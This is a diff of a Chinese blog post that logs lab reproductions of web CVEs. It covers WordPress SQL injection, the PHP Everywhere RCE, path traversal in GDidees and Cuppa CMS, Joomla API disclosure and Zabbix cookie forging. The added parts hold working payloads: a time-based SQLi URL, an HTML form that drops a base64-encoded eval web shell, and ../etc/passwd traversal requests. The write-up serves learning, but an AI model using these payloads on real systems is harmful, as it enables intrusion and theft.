@@ -21,27 +21,30 @@
   <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
   <link rel="preload" href="/css/fonts/MaterialSymbolsRounded.woff2" as="font" type="font/woff2" crossorigin="anonymous">
 
-  <meta name="description" content="近期没有什么比赛，比较空，所以来复现&#x2F;学习一点漏洞，主要是参考春秋云境.com (ichunqiu.com)，附带一点Vulhub 感觉春秋云镜底层原理一样的洞有点多，跳着写吧，感觉没必要按顺序写有点浪费时间。 春秋云镜  SQLI  CVE-2022-32991 CVE-2022-28512   任意文件上传  CVE-2022-30887 CVE-2022-28525   RCE CVE-20">
+  <meta name="description" content="近期没有什么比赛，比较空，所以来复现&#x2F;学习一点漏洞，主要是参考春秋云境.com (ichunqiu.com)，附带一点Vulhub 漏洞栏目过于简单，感觉学到的内容比较少（主要也没钱充会员） 春秋云镜——仿真场景  Initial简单  春秋云镜——漏洞靶标  SQLI  任意文件上传  RCE SSRF 任意文件读取 其他  Vulhub  shiro550 log4j2 fastjson反序列">
 <meta property="og:type" content="article">
 <meta property="og:title" content="春秋云镜刷题记录">
 <meta property="og:url" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="crumbling&#39;s secret room">
-<meta property="og:description" content="近期没有什么比赛，比较空，所以来复现&#x2F;学习一点漏洞，主要是参考春秋云境.com (ichunqiu.com)，附带一点Vulhub 感觉春秋云镜底层原理一样的洞有点多，跳着写吧，感觉没必要按顺序写有点浪费时间。 春秋云镜  SQLI  CVE-2022-32991 CVE-2022-28512   任意文件上传  CVE-2022-30887 CVE-2022-28525   RCE CVE-20">
+<meta property="og:description" content="近期没有什么比赛，比较空，所以来复现&#x2F;学习一点漏洞，主要是参考春秋云境.com (ichunqiu.com)，附带一点Vulhub 漏洞栏目过于简单，感觉学到的内容比较少（主要也没钱充会员） 春秋云镜——仿真场景  Initial简单  春秋云镜——漏洞靶标  SQLI  任意文件上传  RCE SSRF 任意文件读取 其他  Vulhub  shiro550 log4j2 fastjson反序列">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240623000612538.png">
 <meta property="og:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240619135608001.png">
 <meta property="og:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240619141656660.png">
 <meta property="og:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240620142719062.png">
 <meta property="og:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240620144211013.png">
 <meta property="og:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240620144414247.png">
 <meta property="og:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240620145644120.png">
+<meta property="og:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240710131614630.png">
+<meta property="og:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240623160257247.png">
 <meta property="og:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240615135909485.png">
 <meta property="article:published_time" content="2024-06-15T02:33:02.154Z">
-<meta property="article:modified_time" content="2024-06-20T13:19:27.154Z">
+<meta property="article:modified_time" content="2024-07-10T09:42:20.763Z">
 <meta property="article:author" content="crumbling">
 <meta property="article:tag" content="复现">
 <meta property="article:tag" content="漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240619135608001.png">
+<meta name="twitter:image" content="http://example.com/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240623000612538.png">
   
     <link rel="alternate" href="/atom.xml" title="crumbling's secret room" type="application/atom+xml">
   
@@ -294,7 +297,7 @@
   
           </div>
           <div class="wordcount need-seperator meta-info">
-            3.1k 词 
+            5.6k 词 
           </div>
         </div>
         
@@ -304,27 +307,21 @@
       <div class="e-content article-entry" itemprop="articleBody">
         
           <p>近期没有什么比赛，比较空，所以来复现/学习一点漏洞，主要是参考<a target="_blank" rel="noopener" href="https://yunjing.ichunqiu.com/">春秋云境.com (ichunqiu.com)</a>，附带一点Vulhub</p>
-<p>感觉春秋云镜底层原理一样的洞有点多，跳着写吧，感觉没必要按顺序写有点浪费时间。</p>
-<p><a href="#1">春秋云镜</a></p>
+<p>漏洞栏目过于简单，感觉学到的内容比较少（主要也没钱充会员）</p>
+<p><a href="#11">春秋云镜——仿真场景</a></p>
+<ul>
+<li><a href="#initial">Initial简单</a></li>
+</ul>
+<p><a href="#1">春秋云镜——漏洞靶标</a></p>
 <ul>
 <li><p><a href="#sql">SQLI</a></p>
-<ul>
-<li><a href="#CVE-2022-32991">CVE-2022-32991</a></li>
-<li><a href="#CVE-2022-28512">CVE-2022-28512</a></li>
-</ul>
 </li>
 <li><p><a href="#3">任意文件上传</a></p>
-<ul>
-<li><a href="#CVE-2022-30887">CVE-2022-30887</a></li>
-<li><a href="#CVE-2022-28525">CVE-2022-28525</a></li>
-</ul>
 </li>
-<li><a href="#rce">RCE</a><ul>
-<li><a href="#CVE-2022-25578">CVE-2022-25578</a></li>
-<li><a href="#CVE-2022-23906">CVE-2022-23906</a></li>
-<li><a href="#CVE-2022-24663">CVE-2022-24663</a></li>
-</ul>
-</li>
+<li><a href="#rce">RCE</a></li>
+<li><a href="#ssrf">SSRF</a></li>
+<li><a href="#4">任意文件读取</a></li>
+<li><a href="#else">其他</a></li>
 </ul>
 <p><a href="#2">Vulhub</a></p>
 <ul>
@@ -332,7 +329,7 @@
 <li><a href="#log4j2">log4j2</a></li>
 <li><a href="#fastjson">fastjson反序列化漏洞</a></li>
 </ul>
-<h1 id="春秋云镜"><a href="#春秋云镜" class="headerlink" title="春秋云镜"></a><h1 id="1">春秋云镜</h1></h1><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a><h2 id="sql">SQLI</h2></h2><h3 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a><h3 id="CVE-2022-32991">CVE-2022-32991</h3></h3><blockquote>
+<h1 id="春秋云镜——仿真场景"><a href="#春秋云镜——仿真场景" class="headerlink" title="春秋云镜——仿真场景"></a><h1 id="11">春秋云镜——仿真场景</h1></h1><h2 id="Initial简单"><a href="#Initial简单" class="headerlink" title="Initial简单"></a><h2 id="initial">Initial简单</h2></h2><h1 id="春秋云镜——漏洞靶标"><a href="#春秋云镜——漏洞靶标" class="headerlink" title="春秋云镜——漏洞靶标"></a><h1 id="1">春秋云镜——漏洞靶标</h1></h1><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a><h2 id="sql">SQLI</h2></h2><h3 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a><h3 id="CVE-2022-32991">CVE-2022-32991</h3></h3><blockquote>
 <p>描述：该CMS的welcome.php中存在SQL注入攻击。</p>
 </blockquote>
 <p>根据描述，随意注册登录个账号，即可进入到<code>/welcome.php?q=1</code>，这边没啥东西，sqlmap扫了一遍也没有发现问题。</p>
@@ -356,6 +353,20 @@
 <p>描述：Fantastic Blog (CMS)是一个绝对出色的博客/文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该CMS的/single.php路径下，id参数存在一个SQL注入漏洞。</p>
 </blockquote>
 <p>没啥特点，和32991基本一致，不对赘述，免得浪费空间</p>
+<h3 id="CVE-2022-4230"><a href="#CVE-2022-4230" class="headerlink" title="CVE-2022-4230"></a><h3 id="CVE-2022-4230">CVE-2022-4230</h3></h3><blockquote>
+<p>WP Statistics WordPress 插件13.2.9之前的版本不会转义参数，这可能允许经过身份验证的用户执行 SQL 注入攻击。默认情况下，具有管理选项功能 (admin+) 的用户可以使用受影响的功能，但是该插件有一个设置允许低权限用户也可以访问它。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/a0e40cfd-b217-481c-8fc4-027a0a023312/">WP Statistics &lt; 13.2.9 – 经过身份验证的 SQLi |CVE 2022-4230 |插件漏洞 (wpscan.com)</a>记录了漏洞，并且给出了复现方式。</p>
+<blockquote>
+<p>以允许查看WP统计信息的用户身份登录，并通过获取随机数<code>https://example.com/wp-admin/admin-ajax.php?action=rest-nonce</code>，并在下面的URL中使用它，该URL将延迟5s：</p>
+<p><code>http://example.com/wp-json/wp-statistics/v2/metabox?_wpnonce=NONCE&amp;name=words&amp;search_engine=aaa%27%20AND%20(SELECT%205671%20FROM%20(SELECT(SLEEP(5)))Mdgs)--%20HsBR</code></p>
+</blockquote>
+<p>简单来说就是先有个普通用户的权限进入后台，然后去获得随机数，替换url的_wpnonce参数进行sql注入的测试,经过5秒后返回</p>
+<p><img src="/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240623000612538.png" alt="image-20240623000612538"></p>
+<p>表明存在漏洞，然后开始正常的一套sql注入的流程，不过这边似乎有一些检查过滤什么的，直接<code>-u</code>搜不到，所以抓包之后把报文保存下来用<code>-r</code>搜，是能搜到的。</p>
+<p>因为是基于时间盲注做的，所以速度很慢，不知道sqlmap以外的工具效率如何。</p>
+<h3 id="CVE-2022-0784"><a href="#CVE-2022-0784" class="headerlink" title="CVE-2022-0784"></a><h3 id>CVE-2022-0784</h3></h3><p>靶场环境似乎坏了，总之渲染出来的东西排版不太对，能输入内容post的地方也没有找到注入点，看其他人对漏洞的复现情况，是直接对/wp-admin/admin-ajax.php发送post请求进行注入的</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10841?time__1311=mq%2BxB7H4nDlx0nYGkYq0QyyqWTK7u%2BD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F">某Press核心框架WP_Query SQL注入漏洞分析（CVE-2022–21661） - 先知社区 (aliyun.com)</a></p>
 <h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a><h2 id="3">任意文件上传</h2></h2><h3 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a><h3 id="CVE-2022-30887">CVE-2022-30887</h3></h3><blockquote>
 <p>描述：多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action/editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。</p>
 </blockquote>
@@ -410,11 +421,94 @@
 <h3 id="CVE-2022-24663"><a href="#CVE-2022-24663" class="headerlink" title="CVE-2022-24663"></a><h3 id="CVE-2022-24663">CVE-2022-24663</h3></h3><blockquote>
 <p>远程代码执行漏洞，任何订阅者都可以利用该漏洞发送带有“短代码”参数设置为 PHP Everywhere 的请求，并在站点上执行任意 PHP 代码。P.S. 存在常见用户名低权限用户弱口令</p>
 </blockquote>
-<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>对生成代码的控制不恰当（代码注入）</p>
-<p>PHP Everywhere是一个WordPress 插件，作用于&lt;=2.0.3的插件版本，主要是该插件允许通过WordPress短代码执行php命令，又没有对此权限进行鉴权。</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>PHP Everywhere是一个WordPress 插件，作用于&lt;=2.0.3的插件版本。</p>
+<p>没怎么找到这个漏洞的原理详解，个人理解是该插件允许通过WordPress的短代码执行php命令，又没有对此权限进行鉴权。</p>
 <h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>又是找不到入口的一集，spray扫出来：</p>
 <p><img src="/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240620145644120.png" alt="image-20240620145644120"></p>
 <p>又是弱口令环节，<code>test/test</code>，是一个低权限的账号</p>
+<p>因为没太看懂原博客，所以找了个exp，后面是拿exp利用漏洞进行代码注入，随便找个html去写入以下代码并提交，就可以将后门写入系统了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">      <span class="attr">action</span>=<span class="string">&quot;http://eci-2zeel7oe0j83p05ef69w.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;parse-media-shortcode&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;shortcode&quot;</span>&gt;</span></span><br><span class="line">[php_everywhere]<span class="meta">&lt;?php file_put_contents(&quot;/var/www/html/hack.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsgPz4=&quot;)); ?&gt;</span>[/php_everywhere][/php_everywhere]</span><br><span class="line">      <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再后面就是利用hack.php这个后门去拿flag了。</p>
+<p><strong><em>有点疑惑，一来是对整个漏洞的底层逻辑有点没理解，另一个是我字符串只能成功写入，而套一层base64就能正常使用后门</em></strong></p>
+<h3 id="CVE-2022-22965"><a href="#CVE-2022-22965" class="headerlink" title="CVE-2022-22965"></a><h3 id="CVE-2022-22965">CVE-2022-22965</h3></h3><blockquote>
+<p>Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java 企业级应用的开发难度和开发周期,2022年3月31日，VMware Tanzu发布漏洞报告，Spring Framework存在远程代码执行漏洞，在 JDK 9+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定的远程代码执行 (RCE) 的攻击。</p>
+</blockquote>
+<h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><h5 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h5><p>Spring Framework 5.3.X &lt; 5.3.18</p>
+<p>Spring Framework 5.2.X &lt; 5.2.20</p>
+<h5 id="影响条件（同时满足）"><a href="#影响条件（同时满足）" class="headerlink" title="影响条件（同时满足）"></a>影响条件（同时满足）</h5><p>- JDK 9 及以上版本</p>
+<p>- Apache Tomcat 作为 Servlet 容器</p>
+<p>- Spring 框架以及衍生的框架</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a><h2 id="ssrf">SSRF</h2></h2><h3 id="CVE-2022-24112"><a href="#CVE-2022-24112" class="headerlink" title="CVE-2022-24112"></a><h3 id="CVE-2022-24112">CVE-2022-24112</h3></h3><blockquote>
+<p>Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。 Apache APISIX中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin API的IP限制，容易导致远程代码执行。</p>
+</blockquote>
+<h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p><code>batch-requests</code> 插件可以一次接受多个请求并以 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/HTTP_pipelining">http pipeline</a> 的方式在网关发起多个 http 请求，合并结果后再返回客户端，这在客户端需要访问多个接口时可以显著地提升请求性能。</p>
+<h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>Apache APISIX 1.3 ~ 2.12.1 之间的所有版本（不包含 2.12.1 ）</p>
+<p>Apache APISIX 2.10.0 ~ 2.10.4 LTS 之间的所有版本（不包含 2.10.4）</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h4><ul>
+<li>batch-requests插件默认开启状态。</li>
+<li>用户使用了 Apache APISIX 默认配置（启用 Admin API ，使用默认 Admin Key 且没有额外分配管理端口），攻击者可以通过 batch-requests 插件调用 Admin API 。</li>
+</ul>
+<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a><strong>攻击思路</strong></h4><p>1、利用batch-requests 插件漏洞、绕过请求头检测；</p>
+<p>2、通过伪造请求头、向Admin API 注册路由；</p>
+<p>3、注册路由时、携带参数filter_func 传递 lua代码、造成远程代码执行漏洞。</p>
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a><h2 id="4">任意文件读取</h2></h2><h3 id="CVE-2023-27179"><a href="#CVE-2023-27179" class="headerlink" title="CVE-2023-27179"></a><h3 id="CVE-2023-27179">CVE-2023-27179</h3></h3><blockquote>
+<p>GDidees CMS v3.9.1及更低版本被发现存在本地文件泄露漏洞，漏洞通过位于 /_admin/imgdownload.php 的 filename 参数进行利用。</p>
+</blockquote>
+<p>不正确的访问控制</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/Hadi999/516aa25b953b0cba57089a0c11b1305b">CVE-2023-27179.txt (github.com)</a></p>
+<blockquote>
+<p>URL ： [<a target="_blank" rel="noopener" href="http://{gdidees_root}/_admin/imgdownload.php？filename=../../../../../etc/passwd]http：//{gdidees_root}/_admin/imgdownload.php？filename=../../../../../etc/passwd">http://{gdidees_root}/_admin/imgdownload.php？filename=../../../../../etc/passwd]http：//{gdidees_root}/_admin/imgdownload.php？filename=../../../../../etc/passwd</a> （ /etc/passwd 是我们要读取的文件）</p>
+</blockquote>
+<p><code>GET /_admin/imgdownload.php?filename=../../../../../flag HTTP/1.1</code>拿到flag（下载不到东西，抓包可以在response里看到flag）</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><a target="_blank" rel="noopener" href="https://www.gdidees.eu/cms-2-l.html">GDidées - 资源中心 WEB ： CMS的新功能 (gdidees.eu)</a>官网整个3.9.1的版本来</p>
+<p><code>imgdownload.php</code>内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// on essaie de reconnaitre l&#x27;extension pour que le téléchargement corresponde au type de fichier afin d&#x27;éviter les erreurs de corruptions</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>])) &#123;</span><br><span class="line">	<span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">	<span class="variable">$uploadname</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>), <span class="number">0</span>, <span class="number">6</span>).<span class="string">&#x27;.png&#x27;</span>;</span><br><span class="line">    ......</span><br><span class="line">	@<span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>) OR <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>没啥说法，主体就是一个传文件名然后下载的代码，没做鉴权和过滤导致直接访问任意文件</p>
+<h3 id="CVE-2022-25401-CVE-2022-34121"><a href="#CVE-2022-25401-CVE-2022-34121" class="headerlink" title="CVE-2022-25401/CVE-2022-34121"></a><h3 id="CVE-2022-25401">CVE-2022-25401/CVE-2022-34121</h3></h3><blockquote>
+<p>Cuppa CMS v1.0 administrator/templates/default/html/windows/right.php文件存在任意文件读取漏洞</p>
+</blockquote>
+<p>默认是admin/admin，但是不对，也没找到弱口令</p>
+<p>漏洞库链接的poc404了</p>
+<p>不过cuppa在github开源了，查issue能查到<a target="_blank" rel="noopener" href="https://github.com/CuppaCMS/CuppaCMS/issues/32">Unauthorized Arbitrary File Read vulnerability exists in CuppaCMS /administrator/templates/default/html/windows/right.php · Issue #32 · CuppaCMS/CuppaCMS (github.com)</a></p>
+<p>还可以溯源到#18issue，是一个东西似乎，不过还是有cve号，但是这个和描述的url一致。</p>
+<p>然而实际能用的是更早发现的这个issue，也就是漏洞CVE-2022-34121，没有<code>/administratior</code></p>
+<p><img src="/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240710131614630.png" alt="image-20240710131614630"></p>
+<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>看update时间感觉是没改过的版本，但是issue已经complete了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="title function_ invoke__">realpath</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/../../../..&#x27;</span>).<span class="string">&quot;/classes/Cuppa.php&quot;</span>);</span><br><span class="line">    <span class="variable">$cuppa</span> = <span class="title class_">Cuppa</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$path</span>) <span class="variable">$path</span> = <span class="variable">$cuppa</span>-&gt;utils-&gt;<span class="title function_ invoke__">getUrlVars</span>(@<span class="variable">$_POST</span>[<span class="string">&quot;path&quot;</span>]);</span><br><span class="line">    <span class="variable">$language</span> = <span class="variable">$cuppa</span>-&gt;language-&gt;<span class="title function_ invoke__">load</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">w_right</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">        <span class="title">include</span> <span class="title">realpath</span>(<span class="title">__DIR__</span> . &#x27;/../../../..&#x27;).&quot;/&quot;.$<span class="title">_POST</span>[&quot;<span class="title">url</span>&quot;];</span></span><br><span class="line"><span class="class">    ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>同样也是没有过滤参数，应该限定可包含的范围</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a><h2 id="else">其他</h2></h2><h3 id="CVE-2023-23752"><a href="#CVE-2023-23752" class="headerlink" title="CVE-2023-23752"></a><h3 id="CVE-2023-23752">CVE-2023-23752</h3></h3><p>靶场里是信息泄露分类，内容也较少，所以放在其他类里</p>
+<blockquote>
+<p>Joomla是一个开源免费的内容管理系统（CMS），基于PHP开发。在其4.0.0版本到4.2.7版本中，存在一处属性覆盖漏洞，导致攻击者可以通过恶意请求绕过权限检查，访问任意Rest API。</p>
+</blockquote>
+<h4 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>在Joomla受影响的版本（4.0.0 &lt;= Joomla &lt;= 4.2.7）中由于对Web服务端点的访问限制不当，远程攻击者可以绕过安全限制获得Web应用程序敏感信息。</p>
+<p>利用方法为路径：<code>/api/index.php/v1/config/application?public=true</code>，可以拿到网站的配置信息，当然还包括其他接口，靶机的flag放在<code>v1/users</code>里</p>
+<p><img src="/2024/06/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240623160257247.png" alt="image-20240623160257247"></p>
+<p><del>拿靶机的flag只需要考虑用哪个接口就好了，但是完全理解漏洞就要考虑得多了（沟槽的鸣式）</del></p>
+<h4 id="漏洞分析-TODO"><a href="#漏洞分析-TODO" class="headerlink" title="漏洞分析 TODO"></a>漏洞分析 TODO</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51577576/article/details/129479673">[ 漏洞复现篇 ] Joomla未授权访问Rest API漏洞(CVE-2023-23752)_joomla渗透-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12175#toc-4">https://xz.aliyun.com/t/12175#toc-4</a></p>
+<h3 id="CVE-2022-23134-TODO"><a href="#CVE-2022-23134-TODO" class="headerlink" title="CVE-2022-23134 TODO"></a><h3 id="CVE-2022-23134">CVE-2022-23134 TODO</h3></h3><p>属于逻辑漏洞类，数少故合并至其他类</p>
+<blockquote>
+<p>Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。</p>
+</blockquote>
+<p>影响版本</p>
+<ul>
+<li>5.4.0 – 5.4.8</li>
+<li>6.0.0 – 6.0.0beta1</li>
+</ul>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>进入环境之后看到一个登录，搜一下可以找到zabbix的默认账号密码Admin/zabbix.</p>
+<p>根据漏洞报告的漏洞描述，大致的利用方式是构造一个cookie去伪造身份访问setup.php,然后新增数据库添加新管理员</p>
+<p>去<code>setup.php</code>看一下</p>
+<p>因为要伪造cookie，所以抓包一下看看cookie长什么样子</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie<span class="punctuation">:</span> zbx_session=eyJzZXNzaW9uaWQiOiI5YWUxOGRhYWY5MjUyZTgwMWYwMTQyM2YwOTI1MWRmOSIsImNoZWNrX2ZpZWxkc19yZXN1bHQiOnRydWUsInN0ZXAiOjAsImRlZmF1bHRfbGFuZyI6ImVuX0dCIiwiZGVmYXVsdF90aW1lem9uZSI6InN5c3RlbSIsImRlZmF1bHRfdGhlbWUiOiJibHVlLXRoZW1lIiwic2lnbiI6IjkzaTl6K2JTQzRcL252UnpRZXlPVFlLVE1aWnZHSjB0SVwvMjRCOGd0UjhnK28yenIrUUFxd21hQmttb0diVVdSRWpkTU9xV05OSU5aNnM1cVdYMlwvcGZSWEd4dmJEd3JGMENJT3V4QWtLWXJrbkhlUE01K04rT0VJdG5nTUM1bnlaa00yaU8zWkw0RDFZV2lpWHQySllIYmpmOXJHdTUxSDY1VDFIbGlFTWNEbmpCQ1lMUmo2eHZVeVdDUlpTS3FDUEpYZU8rN0lNMElMS2t5OFUzdCtSUlF5c2hqRVFvZjVsK1NUTlYrQU4xS3c9In0%<span class="number">3</span>D</span><br></pre></td></tr></table></figure>
+<p><code>%3D</code>是<code>=</code>盲猜一个base64</p>
